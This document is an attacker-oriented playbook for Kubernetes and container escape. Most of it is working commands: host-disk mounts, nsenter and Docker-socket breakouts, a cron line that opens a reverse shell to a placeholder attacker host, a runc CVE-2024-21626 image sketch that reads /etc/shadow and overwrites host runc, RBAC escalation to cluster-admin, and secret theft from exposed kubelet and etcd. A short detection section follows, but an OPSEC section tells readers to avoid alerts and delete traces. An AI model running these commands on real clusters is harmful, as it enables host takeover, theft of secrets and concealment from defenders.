# Kubernetes & Container Escape

CWE-668 (Exposure to Wrong Sphere), CWE-94 (Code Injection), CWE-269, CWE-862 (Missing Authorization).
ATT&CK: T1611 (Escape to Host), T1610 (Deploy Container), T1190 (Exploit Public-Facing App),
T1078 (Valid Accounts), T1552.007 (Container API).

## Theory / Mechanism

Containers share the host kernel; isolation depends on namespaces, cgroups, capabilities, seccomp
and the container runtime (runc/containerd). Escape = breaking that isolation to reach the host
node; from a node you typically own the kubelet and every pod's secrets. Two broad classes:
**configuration escapes** (privileged pod, hostPID, mounted Docker socket, writable hostPath) and
**runtime CVEs** (runc/BuildKit). Separately, **RBAC privesc** abuses over-broad ServiceAccount
permissions, and exposed control-plane components (kubelet 10250, etcd 2379) bypass auth entirely.

## 1. Enumerate footing

```bash
# From a pod's mounted ServiceAccount token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
kubectl --token="$TOKEN" --server="$APISERVER" --insecure-skip-tls-verify auth can-i --list

# Automated abuse-primitive finder (pods/exec, secrets, escalate verbs, hostPath, privileged):
python3 ../scripts/k8s_can_i_abuse.py --kubeconfig ./kubeconfig
# Tools: peirates ; kubectl auth can-i --list ; mkat ; kube-hunter
```

## 2. Configuration escapes (working)

```bash
# (a) Privileged container -> mount host disk
fdisk -l                              # find host disk, e.g. /dev/sda1
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/bash

# (b) hostPID=true -> reach host root FS via PID 1
ls /proc/1/root/                      # host filesystem
chroot /proc/1/root /bin/bash

# (c) CAP_SYS_ADMIN / privileged -> nsenter into the host init namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# (d) Mounted Docker socket
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# (e) Writable hostPath -> persist on host (cron)
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /hostpath/etc/cron.d/x
```

## 3. Modern 2024-2026 runtime CVEs

### CVE-2024-21626 — runc "Leaky Vessels" (CVSS 8.6, runc ≤ 1.1.11)

runc leaks an internal file descriptor (typically `/proc/self/fd/7`) pointing to the **host**
working directory before `pivot_root`. If the container's `process.cwd` (or a Dockerfile `WORKDIR`)
resolves through that leaked fd, the process lands on the host filesystem — full escape, including
overwriting host binaries. Exploitable via `runc run` (malicious image) or `runc exec`, and through
Docker/Kubernetes by pulling a crafted image or setting a specific workdir. Fixed in **runc 1.1.12**
(2024-01-31). Sibling BuildKit flaws: CVE-2024-23651/-23652/-23653 (< 0.12.5).

```bash
# Detect vulnerable runtime on a node you've reached
runc --version            # escape if <= 1.1.11
# Malicious-image PoC shape (build with WORKDIR pointing at the leaked fd):
#   FROM scratch
#   WORKDIR /proc/self/fd/7      # lands the process in the host CWD on next exec
#   COPY escape.sh /escape.sh
#   ENTRYPOINT ["/escape.sh"]    # escape.sh: cat /proc/self/cwd/../../../etc/shadow, overwrite host runc, etc.
# Public reference PoC: github.com/strikoder/cve-2024-21626-runc-1.1.11-escape
```

### CVE-2025-1974 — IngressNightmare (CVSS 9.8, ingress-nginx)

Wiz disclosed (2025-03-24) a chain in the **ingress-nginx admission controller**. The `uid` field
of an Ingress object is injected unsanitized into the NGINX config template; an attacker who can
reach the admission webhook (often internal-only, reachable from **any pod** by default) forces
NGINX to load a malicious shared library at config-test time → **unauth RCE** in the controller
pod. That pod holds a **highly privileged ServiceAccount** that can read secrets cluster-wide →
**cluster takeover**. ~43% of cloud environments were vulnerable; patched in **1.11.5 / 1.12.1**.
Chained CVEs: -1097, -1098, -24513, -24514.

```bash
# Recon: is a vulnerable ingress-nginx admission webhook reachable?
kubectl get pods -A -o wide | grep ingress-nginx
kubectl get pod -n ingress-nginx <ctrl-pod> -o jsonpath='{.spec.containers[0].image}'  # check version tag
# The admission Service is typically ingress-nginx-controller-admission:443 (ClusterIP) -
# reachable from any pod; exploitation = AdmissionReview request injecting nginx config that
# loads an attacker .so. After RCE, loot the controller SA token:
cat /var/run/secrets/kubernetes.io/serviceaccount/token   # -> read all cluster secrets
# Patch / mitigate: upgrade to 1.11.5+/1.12.1+, restrict webhook to API server only,
# reduce controller SA privileges.
```

## 4. RBAC privilege escalation primitives

| Permission | Abuse |
|------------|-------|
| `pods/exec`, `pods/attach` | Exec into a higher-privileged pod, steal its SA token |
| `create pods` (+ schedule on any node) | Mount hostPath `/` or run privileged → node compromise |
| `get/list secrets` | Read all ServiceAccount tokens / app secrets in scope |
| `create serviceaccounts/token` (TokenRequest) | Mint tokens for privileged SAs |
| `escalate` / `bind` on roles | Grant yourself cluster-admin (bypasses the privilege-ceiling check) |
| `nodes/proxy` | Reach kubelet API on every node → exec in any pod |
| `impersonate` (users/groups/SAs) | Act as cluster-admin via `--as` |

```bash
# escalate verb -> become cluster-admin
kubectl create clusterrolebinding pwn --clusterrole=cluster-admin \
  --serviceaccount=$NS:$SA            # works if you hold rbac escalate/bind
# impersonate
kubectl --as=system:admin get secrets -A
# nodes/proxy -> kubelet exec on a node
kubectl get --raw "/api/v1/nodes/NODE/proxy/run/NS/POD/CONTAINER?cmd=id"
```

## 5. Exposed control-plane components

```bash
# Unauthenticated kubelet (10250/tcp)
curl -sk https://NODE_IP:10250/pods | jq -r '.items[].metadata.name'
curl -sk "https://NODE_IP:10250/run/NS/POD/CONTAINER" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# Exposed etcd (2379/tcp) without auth -> every secret in plaintext
ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix
```

## Detection

```yaml
title: Container Escape / Host Namespace Access
id: b3d8a2c5-container-escape
status: experimental
logsource:
  product: linux
  category: process_creation
detection:
  nsenter:
    Image|endswith: '/nsenter'
    CommandLine|contains: '--target 1'
  procfd_cwd:
    CurrentDirectory|contains: '/proc/self/fd/'   # runc Leaky Vessels indicator
  ingress_so:
    Image|contains: 'ingress-nginx'
    CommandLine|contains: '/proc/'                # IngressNightmare .so load
  condition: nsenter or procfd_cwd or ingress_so
level: high
falsepositives: [debugging sidecars, legitimate node maintenance]
```

- **Falco/Sysdig**: "Container escape" / "Drop and execute new binary in container" / shared-lib
  load from `/proc` in the ingress pod ("Potential IngressNightmare Exploitation"). kube-bench /
  kube-hunter for posture; alert on `escalate`/`bind`/`impersonate` and ServiceAccount TokenRequest
  in the kube audit log.
- Inventory: runc ≤ 1.1.11, ingress-nginx < 1.11.5/1.12.1, BuildKit < 0.12.5.

IOCs: process cwd under `/proc/self/fd/`; `nsenter --target 1`; writes to host runc binary; ingress
pod loading a `.so` from `/proc`; new clusterrolebinding to cluster-admin from a workload SA.

## OPSEC

- Overwriting host runc (CVE-2024-21626) gives durable host control but is **destructive/noisy** —
  prefer read-only host-FS access (read `/proc/self/cwd/../...`) when you only need data.
- `nsenter`/`chroot` into the host runs as host root — kernel/audit/Falco-visible; expect alerts on
  hardened clusters (SELinux enforcing on RHEL/OpenShift blocks much of the runc path).
- IngressNightmare hits an **internal** webhook — low *external* noise — but the controller pod
  loading a remote `.so` is a strong runtime signal; clean up injected config/objects.
- RBAC `escalate`/`bind`/`impersonate` and TokenRequest calls are all in the **kube audit log**;
  delete the clusterrolebinding/created pods you used.

## References

- Snyk Labs, "Leaky Vessels: Docker and runc Container Breakout Vulnerabilities" (CVE-2024-21626) — https://labs.snyk.io/resources/leaky-vessels-docker-runc-container-breakout-vulnerabilities/
- NVD, CVE-2024-21626 — https://nvd.nist.gov/vuln/detail/cve-2024-21626 ; PoC https://github.com/strikoder/cve-2024-21626-runc-1.1.11-escape
- Wiz, "IngressNightmare (CVE-2025-1974)" — https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
- Kubernetes Blog, "Ingress-nginx CVE-2025-1974: What You Need to Know" — https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/
- Sysdig, "Detecting and Mitigating IngressNightmare" — https://www.sysdig.com/blog/detecting-and-mitigating-ingressnightmare
- Datadog Security Labs, EKS identities (RBAC + node pivot) — https://securitylabs.datadoghq.com/articles/amazon-eks-attacking-securing-cloud-identities/
